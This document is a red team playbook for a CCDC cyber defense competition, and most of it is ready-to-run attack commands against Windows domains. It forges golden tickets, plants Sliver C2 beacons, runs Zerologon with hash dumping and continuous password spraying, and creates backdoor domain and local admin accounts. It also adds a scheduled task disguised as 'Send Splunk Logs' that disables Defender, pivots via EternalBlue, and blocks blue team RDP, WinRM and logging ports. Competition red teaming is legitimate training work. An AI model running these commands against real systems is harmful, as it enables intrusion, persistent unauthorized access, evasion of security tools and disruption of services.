# CCDC Red Team Playbook

Step-by-step execution plan from flag drop to full dominance. Replace `<T>` with the target team number, or use `all` where supported.

> **Pre-req**: `source setup.sh` in your terminal first — gives you short aliases for every script.

---

## Phase 1 — Golden Tickets (Immediately at Flag Drop)

Forge golden tickets for every team. This gives us persistent Kerberos auth as DA — no passwords needed after this.

```bash
forgegold all
```

This generates `team1.ccache` through `team5.ccache` and `team<N>_use.sh` helper scripts for each.

To forge a single team:
```bash
forgegold <T>
```

If default creds have been changed, override:
```bash
forgegold <T> Administrator:NewPassword123
```

---

## Phase 2 — Plant C2 on Every Server

Use the golden tickets to plant Sliver beacons on all hosts across all teams. Planter defaults to the standard C2 URL automatically when no local .exe files are present.

```bash
# All hosts for one team (uses golden ticket + default C2 URL automatically)
planter <T>

# All teams, one after another
for t in 1 2 3 4 5; do
  planter $t
done

# Override with a custom URL if needed
planter <T> -w https://example.com/custom_beacon.exe
```

Or from inside a team's use-script, use the `c) Plant C2` menu option:
```bash
./team<T>_use.sh
# → press c, pick a host
```

---

## Phase 3 — Zerologon Every DC

Zero the machine account password on every team's domain controller. Dump all hashes while we're at it.

```bash
zero -d all
```

Single team:
```bash
zero -d <T>
```

Just dump (if already zerologon'd):
```bash
zero -jd <T>
```

---

## Phase 4 — Continuous Password Spray Loop

Run spray in a loop so we catch any password resets or new accounts. Runs every 5 minutes forever. Use `-s` to skip hosts that are unreachable or too slow (the 30s auto-skip prompt will also fire during runs).

```bash
# Single team — background loop
while true; do
  spray <T> -a
  echo "[*] Sleeping 5 minutes..."
  sleep 300
done

# Skip a known-dead host
while true; do
  spray <T> -a -s morality
  sleep 300
done

# All teams in rotation
while true; do
  for t in 1 2 3 4 5; do
    spray $t -a
  done
  echo "[*] Full rotation complete. Sleeping 5 minutes..."
  sleep 300
done
```

---

## Phase 5 — Add Backdoor Domain Admin (johnson)

Add user `johnson` to Enterprise Admins on every team's DC. Run on each team:

```bash
# Create user
exec <T> curiosity -c "net user johnson Th3cake1salie! /add /domain"

# Add to Enterprise Admins
exec <T> curiosity -c "net group \"Enterprise Admins\" johnson /add /domain"

# Add to Domain Admins for good measure
exec <T> curiosity -c "net group \"Domain Admins\" johnson /add /domain"
```

All teams at once:
```bash
for t in 1 2 3 4 5; do
  exec $t curiosity -c "net user johnson Th3cake1salie! /add /domain"
  exec $t curiosity -c "net group \"Enterprise Admins\" johnson /add /domain"
  exec $t curiosity -c "net group \"Domain Admins\" johnson /add /domain"
done
```

---

## Phase 6 — Add Backdoor Local Admin (longfall)

Add `longfall` as a local admin on every host across every team:

```bash
# Single host
exec <T> <host> -c "net user longfall Th3cake1salie! /add && net localgroup Administrators longfall /add"

# All hosts on one team
for h in curiosity morality intelligence anger fact space adventure; do
  exec <T> $h -c "net user longfall Th3cake1salie! /add && net localgroup Administrators longfall /add"
done

# All teams, all hosts
for t in 1 2 3 4 5; do
  for h in curiosity morality intelligence anger fact space adventure; do
    exec $t $h -c "net user longfall Th3cake1salie! /add && net localgroup Administrators longfall /add"
  done
done
```

---

## Phase 7 — Disable Windows Defender (Persistent Scheduled Task)

Create a scheduled task disguised as "Send Splunk Logs" that disables Defender every minute:

```bash
# Single host
exec <T> <host> -c "schtasks /create /tn \"Send Splunk Logs\" /sc minute /mo 1 /tr \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \\\"Set-MpPreference -DisableRealtimeMonitoring \$true\\\"\" /ru SYSTEM /f"

# All hosts on one team
for h in curiosity morality intelligence anger fact space adventure; do
  exec <T> $h -c "schtasks /create /tn \"Send Splunk Logs\" /sc minute /mo 1 /tr \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \\\"Set-MpPreference -DisableRealtimeMonitoring \$true\\\"\" /ru SYSTEM /f"
done

# All teams, all hosts
for t in 1 2 3 4 5; do
  for h in curiosity morality intelligence anger fact space adventure; do
    exec $t $h -c "schtasks /create /tn \"Send Splunk Logs\" /sc minute /mo 1 /tr \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \\\"Set-MpPreference -DisableRealtimeMonitoring \$true\\\"\" /ru SYSTEM /f"
  done
done
```

---

## Phase 8 — Pivot Through XP Box (Adventure)

Set up EternalBlue pivot through Adventure (.72) to reach internal 172.16.x.x networks.

> ⚠️ ligo is **untested** — may need manual adjustment.

```bash
# Exploit and set up SOCKS proxy
ligo <T>

# Or all teams
ligo all
```

After ligo runs, source the generated proxy helper:
```bash
source team<T>_proxy.sh
```

Then use the `pc<T>` alias to route through proxychains:
```bash
pc<T> netexec smb 172.16.3.140 -u Administrator --use-kcache
pc<T> exec <T> -x curiosity -c "whoami"
```

For Sliver-based pivots (if a beacon is already running on the DC):

> ⚠️ pivot is **untested** — may need port adjustments.

```bash
pivot <T>
source team<T>_proxy.sh
```

---

## Phase 9 — Block Blue Team Services with Firewall Rules

Use these templates to block specific ports on target machines. Replace `<PORT>` with the service port you want to kill.

### Block a Single Port (Inbound + Outbound)

```bash
# Block inbound
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Block <PORT> In\" dir=in action=block protocol=tcp localport=<PORT>"

# Block outbound
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Block <PORT> Out\" dir=out action=block protocol=tcp localport=<PORT>"
```

### Common Ports to Block

| Port | Service | Why Block It |
|------|---------|-------------|
| 3389 | RDP | Cut blue team remote access |
| 5985 | WinRM | Cut PowerShell remoting |
| 5986 | WinRM (HTTPS) | Cut secure PS remoting |
| 443 | HTTPS | Break web management consoles |
| 80 | HTTP | Break web services / scoring |
| 3306 | MySQL | Break database services |
| 1433 | MSSQL | Break SQL Server |
| 514 | Syslog | Kill log forwarding |
| 8089 | Splunk mgmt | Kill Splunk management |
| 9997 | Splunk fwd | Kill Splunk forwarder |

### Block Multiple Ports at Once (One-Liner)

```bash
# Block RDP + WinRM + Splunk on a host
exec <T> <host> -c "for %p in (3389 5985 5986 8089 9997) do netsh advfirewall firewall add rule name=\"Block %p In\" dir=in action=block protocol=tcp localport=%p"
```

### Block Ports on All Hosts, All Teams

```bash
PORTS="3389 5985 5986 8089 9997"
for t in 1 2 3 4 5; do
  for h in curiosity morality intelligence anger fact space adventure; do
    exec $t $h -c "for %p in ($PORTS) do netsh advfirewall firewall add rule name=\"Block %p In\" dir=in action=block protocol=tcp localport=%p"
  done
done
```

### Remove a Firewall Rule (If Needed)

```bash
exec <T> <host> -c "netsh advfirewall firewall delete rule name=\"Block <PORT> In\""
exec <T> <host> -c "netsh advfirewall firewall delete rule name=\"Block <PORT> Out\""
```

### Nuclear Option — Block Everything Except Our C2

```bash
# Block ALL inbound except Sliver mTLS (default 8888) and SMB (445, so we keep access)
exec <T> <host> -c "netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound"
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Allow SMB\" dir=in action=allow protocol=tcp localport=445"
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Allow C2 Out\" dir=out action=allow protocol=tcp remoteport=8888"
exec <T> <host> -c "netsh advfirewall firewall add rule name=\"Allow DNS Out\" dir=out action=allow protocol=udp remoteport=53"
```

---

## Quick Reference — Full Blitz Script

Run everything in order for a single team:

```bash
T=5  # ← set team number

# 1. Golden ticket
forgegold $T

# 2. Plant C2
planter $T

# 3. Zerologon + dump
zero -d $T

# 4. Backdoor DA
exec $T curiosity -c "net user johnson Th3cake1salie! /add /domain"
exec $T curiosity -c "net group \"Enterprise Admins\" johnson /add /domain"
exec $T curiosity -c "net group \"Domain Admins\" johnson /add /domain"

# 5. Local admin on all hosts
for h in curiosity morality intelligence anger fact space adventure; do
  exec $T $h -c "net user longfall Th3cake1salie! /add && net localgroup Administrators longfall /add"
done

# 6. Disable Defender on all hosts
for h in curiosity morality intelligence anger fact space adventure; do
  exec $T $h -c "schtasks /create /tn \"Send Splunk Logs\" /sc minute /mo 1 /tr \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \\\"Set-MpPreference -DisableRealtimeMonitoring \$true\\\"\" /ru SYSTEM /f"
done

# 7. Pivot setup
ligo $T

# 8. Block blue team services
for h in curiosity morality intelligence anger fact space adventure; do
  exec $T $h -c "for %p in (3389 5985 5986 8089 9997) do netsh advfirewall firewall add rule name=\"Block %p In\" dir=in action=block protocol=tcp localport=%p"
done
```
